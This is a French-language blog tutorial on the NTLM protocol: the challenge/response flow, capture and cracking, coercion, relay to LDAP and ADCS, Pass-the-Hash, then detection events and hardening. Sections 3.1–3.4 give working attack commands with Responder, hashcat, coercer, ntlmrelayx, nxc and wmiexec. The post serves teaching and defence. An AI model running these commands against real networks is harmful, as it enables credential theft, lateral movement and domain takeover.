---
title: "NTLM — Fonctionnement, attaques et durcissement"
date: 2026-11-22 10:00:00 +0100
categories: [Active Directory]
tags: [ntlm, ntlm-relay, pass-the-hash, responder, coercion, active-directory]
description: "Le protocole d'authentification hérité de Windows : challenge/réponse, pourquoi la capture, le relais et le Pass-the-Hash fonctionnent, et comment couper court."
---

> **TL;DR** — NTLM est un protocole challenge/réponse où la preuve d'identité dérive directement du hash NT, sans lien avec le service visé. D'où trois familles d'attaques : **capturer** la réponse pour la casser hors ligne, la **relayer** vers un autre service, ou **rejouer** le hash sans jamais le casser (Pass-the-Hash). Le durcissement tient en trois leviers : **signer** (SMB/LDAP + channel binding), **segmenter** (tiering, Protected Users), et **désactiver** NTLM là où c'est possible — après audit.
{: .prompt-info }

| | |
|---|---|
| **Niveau** | Intermédiaire |
| **Prérequis** | Notions d'Active Directory, hash NT, bases SMB / LDAP |
| **Attaques couvertes** | Capture NTLMv2, coercition, NTLM Relay, Pass-the-Hash |
| **Outils** | Responder, ntlmrelayx, impacket, nxc, hashcat |

## 1. La notion

### 1.1 À quoi ça sert

NTLM (*NT LAN Manager*) est le protocole d'authentification **historique** de Windows, antérieur à l'intégration de Kerberos dans Active Directory. Il n'a jamais disparu : il reste présent comme **mécanisme de repli** dès que Kerberos ne peut pas s'appliquer — connexion à un hôte par son adresse IP plutôt que par son nom, absence de SPN, machine hors domaine, hôtes en groupe de travail, protocoles anciens. Dans la plupart des réseaux d'entreprise, une partie non négligeable des authentifications se fait encore en NTLM, souvent à l'insu des administrateurs.

Là où Kerberos s'appuie sur un tiers de confiance (le KDC) et des tickets (voir l'article [Kerberos](/posts/kerberos/)), NTLM est un simple **challenge/réponse** entre un client et un serveur, où le domaine n'intervient qu'en fin de parcours pour valider la réponse.

### 1.2 Comment ça marche

L'authentification NTLM se déroule en trois messages.

```text
Client                              Serveur                         DC
  │                                    │                             │
  │ ── 1. NEGOTIATE ──────────────────▶│                             │
  │ ◀─ 2. CHALLENGE (nonce serveur) ───│                             │
  │                                    │                             │
  │ ── 3. AUTHENTICATE ───────────────▶│                             │
  │     (réponse = f(hash NT,          │ ── validation via ─────────▶│
  │      challenge, …))                │    Netlogon / NETLOGON      │
  │                                    │ ◀─ OK / KO ─────────────────│
```

1. **NEGOTIATE** — le client annonce qu'il veut s'authentifier et les options qu'il supporte.
2. **CHALLENGE** — le serveur renvoie un *nonce* aléatoire (le challenge).
3. **AUTHENTICATE** — le client calcule une **réponse** à partir de son hash NT, du challenge, et (en NTLMv2) d'éléments supplémentaires : un challenge client, un horodatage et le nom du serveur cible. Le serveur ne connaît pas le hash de l'utilisateur ; il transmet la réponse au contrôleur de domaine via le canal sécurisé Netlogon, qui valide.

Deux versions coexistent :

- **NTLMv1** — ancien, cryptographiquement faible (basé sur DES), et dont la réponse peut être transformée en hash NT exploitable. À proscrire.
- **NTLMv2** — plus robuste, intègre un horodatage et des champs cible, mais reste **cassable hors ligne** par force brute / dictionnaire si le mot de passe est faible.

### 1.3 Ce qu'il faut retenir pour la suite

Quatre propriétés expliquent toutes les attaques qui suivent :

- **La preuve d'identité dérive du hash NT**, pas du mot de passe en clair. Connaître le hash suffit pour s'authentifier. → *Pass-the-Hash* (§ 3.4).
- **La réponse NTLMv2 capturée est cassable hors ligne** si le mot de passe est faible. → *capture et crack* (§ 3.1).
- **Dans le cas de base, la réponse n'est pas liée au service cible** (pas de *channel/service binding*) : une réponse destinée à un serveur peut être présentée à un autre. → *NTLM Relay* (§ 3.3).
- **Windows s'authentifie spontanément** vers un hôte distant à la moindre sollicitation (accès à un partage, chargement d'une icône, etc.). → *coercition* (§ 3.2), qui alimente la capture et le relais.

## 2. Surface d'attaque

| Élément abusable | Accès requis | Attaque |
|------------------|--------------|---------|
| Résolution de noms (LLMNR / NBT-NS / mDNS) | Position sur le réseau (L2) | § 3.1 |
| Fonctions qui déclenchent une auth sortante (MS-RPRN, MS-EFSR, PetitPotam…) | Un compte de domaine (souvent) | § 3.2 |
| Service sans signature obligatoire (SMB, LDAP, HTTP/ADCS) | Capture ou coercition d'une auth | § 3.3 |
| Hash NT en mémoire ou extrait | Admin local sur un hôte | § 3.4 |

## 3. Attaques

> Les manipulations ci-dessous visent un **lab ou un périmètre dûment autorisé**. Elles illustrent la méthodologie ; adaptez interfaces, cibles et comptes à votre environnement.
{: .prompt-warning }

### 3.1 Capture et crack NTLMv2

**Principe** — Quand un hôte Windows cherche à résoudre un nom introuvable via DNS, il interroge en diffusion les protocoles **LLMNR**, **NBT-NS** et **mDNS**. Un attaquant présent sur le même segment répond « c'est moi », la victime s'authentifie vers lui en NTLM, et il capture la réponse NTLMv2 (§ 1.3). Celle-ci est cassable hors ligne.

**Prérequis** — Une position sur le réseau (même domaine de diffusion que les victimes). Aucun credential.

**Exploitation**

```bash
# Empoisonnement LLMNR/NBT-NS/mDNS et capture des réponses
responder -I eth0
# → les hash NTLMv2 capturés sont écrits dans /usr/share/responder/logs/
```

Crack hors ligne (mode hashcat `5600` pour NTLMv2) :

```bash
hashcat -m 5600 captured.hashes rockyou.txt
```

**Résultat / impact** — Le mot de passe en clair des comptes dont la réponse était faible. Un point d'entrée dans le domaine sans credential de départ. Si le mot de passe résiste au crack, la réponse peut encore servir au **relais** (§ 3.3) plutôt qu'au crack.

### 3.2 Coercition d'authentification

**Principe** — Plusieurs fonctions RPC de Windows acceptent un chemin UNC en paramètre et déclenchent, côté serveur, une authentification **sortante** vers ce chemin. En pointant ce chemin vers une machine contrôlée, on force l'hôte distant — y compris un **contrôleur de domaine**, qui s'authentifie alors en tant que compte machine `DC$` — à venir s'authentifier chez nous (§ 1.3). La coercition ne casse rien par elle-même : elle **alimente** la capture (§ 3.1) et surtout le relais (§ 3.3).

**Prérequis** — Généralement un compte de domaine valide (variable selon la méthode). Certaines voies historiques ne nécessitaient aucune authentification.

**Exploitation (vue d'ensemble)**

```bash
# Famille d'outils déclenchant une auth sortante via différents RPC
# (MS-RPRN, MS-EFSR, MS-FSRVP…). Exemple générique :
coercer coerce -u analyst -p 'Passw0rd!' -d corp.local \
  -t 10.10.10.10 -l 10.10.10.50   # 10.10.10.50 = hôte attaquant à l'écoute
```

**Résultat / impact** — Une authentification du compte visé (souvent `MACHINE$`, voire `DC$`) dirigée vers l'attaquant. Combinée au relais vers LDAP ou ADCS, c'est l'un des chemins les plus directs vers le compromis du domaine.

### 3.3 NTLM Relay

**Principe** — Comme la réponse NTLM n'est pas liée, dans le cas de base, au service cible (§ 1.3), on peut la **transférer** vers un autre service qui n'impose pas de signature. L'attaquant se place en relais : la victime s'authentifie « vers lui », et lui rejoue immédiatement cet échange vers un troisième service, en s'y faisant authentifier **en tant que la victime**. On ne casse jamais le hash — on détourne l'authentification en temps réel.

Cibles classiques du relais :

- **SMB** sans signature → exécution de commandes, accès aux partages.
- **LDAP / LDAPS** sans signature ni *channel binding* → modification d'objets AD (ex. configurer une RBCD, ajouter un délégué).
- **HTTP vers ADCS** (*ESC8*) → obtention d'un certificat au nom de la victime, réutilisable pour s'authentifier durablement.

**Prérequis** — Une authentification à relayer (capture § 3.1 ou coercition § 3.2) **et** un service cible dont la signature n'est pas obligatoire.

**Exploitation**

```bash
# Relais vers LDAP pour configurer une délégation (RBCD) sur une machine cible
impacket-ntlmrelayx -t ldap://dc01.corp.local --delegate-access -smb2support

# Relais vers l'interface web d'ADCS (ESC8) pour obtenir un certificat
impacket-ntlmrelayx -t http://ca01.corp.local/certsrv/certfnsh.asp \
  -smb2support --adcs --template DomainController
```

**Résultat / impact** — Prise de contrôle d'une machine (via RBCD), d'un compte, ou obtention d'un certificat offrant une authentification persistante. Lorsque la source est une coercition de `DC$`, le relais vers ADCS/LDAP mène fréquemment au **Domain Admin**.

### 3.4 Pass-the-Hash

**Principe** — Puisque la preuve d'identité NTLM dérive du hash NT (§ 1.3), un attaquant qui possède ce hash peut s'authentifier **directement**, sans jamais connaître ni casser le mot de passe. C'est la base du mouvement latéral sous Windows.

**Prérequis** — Le hash NT du compte cible (extrait de la base SAM locale, du cache, ou de la mémoire LSASS après compromission d'un hôte en admin local).

**Exploitation**

```bash
# Authentification SMB avec un hash NT (format LM:NT, LM vide)
nxc smb 10.10.10.0/24 -u administrator -H :<NT_HASH>

# Shell distant via Pass-the-Hash
impacket-wmiexec -hashes :<NT_HASH> corp.local/administrator@10.10.10.20
```

**Résultat / impact** — Exécution d'actions et mouvement latéral au nom du compte, sans son mot de passe. Un seul hash d'administrateur local réutilisé sur plusieurs machines (absence de LAPS) permet souvent de compromettre tout un parc.

## 4. Vulnérabilités et mauvaises configurations courantes

| Constat | Pourquoi c'est dangereux | Comment le vérifier |
|---------|--------------------------|---------------------|
| LLMNR / NBT-NS / mDNS actifs | Capture NTLMv2 par empoisonnement | `responder -I eth0 -A` (mode analyse, non intrusif) |
| **SMB signing** non obligatoire | Relais SMB possible | `nxc smb 10.10.10.0/24 --gen-relay-list relay.txt` |
| **LDAP signing** / channel binding absents | Relais vers LDAP → modif AD | `nxc ldap dc01 -u user -p pass -M ldap-checker` |
| NTLMv1 autorisé | Réponse convertible en hash NT | GPO *LAN Manager authentication level* |
| Même mot de passe d'admin local partout | Un hash → tout le parc (Pass-the-Hash) | Absence de LAPS ; test de réutilisation |
| NTLM encore utilisé sur des services critiques | Surface d'attaque évitable | Journaux d'audit NTLM (voir § 5) |

## 5. Détection

| Attaque | Source / Event ID | Signal à surveiller |
|---------|-------------------|---------------------|
| Empoisonnement LLMNR/NBT-NS | Capteurs réseau / honeypot | Réponses de résolution incohérentes ; comptes « pot de miel » sollicités |
| Coercition | 5145 (accès partage) / télémétrie RPC | Accès `\pipe\spoolss`, `\pipe\efsrpc`, `\pipe\lsarpc` suivis d'une auth sortante |
| NTLM Relay | 4624 (type 3, NTLM) | Ouverture NTLM dont l'**IP source ≠ IP du compte** supposé ; `DC$` s'authentifiant vers un hôte inattendu |
| Pass-the-Hash | 4624 / 4625 | Ouverture NTLM (type 3) pour des comptes censés utiliser Kerberos ; connexions depuis des hôtes inhabituels |
| NTLMv1 résiduel | Audit NTLM (8004) | Toute authentification NTLMv1 |

> Activez l'**audit NTLM** avant toute extinction : *Network security: Restrict NTLM: Audit NTLM authentication in this domain*. Les événements **8004** (DC), **8003/8002** (serveurs) cartographient qui utilise encore NTLM, et vers quoi — c'est le préalable indispensable à une désactivation sans casse.
{: .prompt-tip }

## 6. Recommandations

| Priorité | Mesure | Coupe |
|----------|--------|-------|
| <span class="sev sev-critical">Critique</span> | **SMB signing obligatoire** sur tous les hôtes | § 3.3 (relais SMB) |
| <span class="sev sev-critical">Critique</span> | **LDAP signing + channel binding (EPA)** sur les DC | § 3.3 (relais LDAP / ESC8) |
| <span class="sev sev-high">Haute</span> | Désactiver **LLMNR, NBT-NS, mDNS** par GPO | § 3.1 |
| <span class="sev sev-high">Haute</span> | Interdire **NTLMv1** (niveau LM = *Send NTLMv2 response only. Refuse LM & NTLM*) | § 3.1, § 3.4 |
| <span class="sev sev-high">Haute</span> | **LAPS** : mot de passe d'admin local unique par machine | § 3.4 |
| <span class="sev sev-medium">Moyenne</span> | **Protected Users** pour les comptes privilégiés (NTLM désactivé pour eux) | § 3.4 |
| <span class="sev sev-medium">Moyenne</span> | Restreindre / désactiver NTLM progressivement (*Restrict NTLM*), après audit | § 3.1–3.4 |

## 7. Bonnes pratiques

- [ ] **Auditer** l'usage NTLM (événements 8004) avant toute restriction
- [ ] **Tiering** des comptes d'administration pour limiter la valeur d'un hash volé
- [ ] Déployer **LAPS** et bannir la réutilisation des mots de passe d'admin local
- [ ] Préférer l'accès aux ressources **par nom DNS** (favorise Kerberos) plutôt que par IP
- [ ] Placer les comptes sensibles dans **Protected Users** et des silos d'authentification
- [ ] Viser à terme un domaine **NTLM-free**, service par service

## Références

- [MS-NLMP — NT LAN Manager Authentication Protocol](https://learn.microsoft.com/openspecs/windows_protocols/ms-nlmp/)
- [The Hacker Recipes — NTLM](https://www.thehacker.recipes/ad/movement/ntlm)
- [Microsoft — Restricting NTLM usage](https://learn.microsoft.com/windows/security/threat-protection/security-policy-settings/network-security-restrict-ntlm-ntlm-authentication-in-this-domain)
- [Microsoft — Protected Users Security Group](https://learn.microsoft.com/windows-server/security/credentials-protection-and-management/protected-users-security-group)
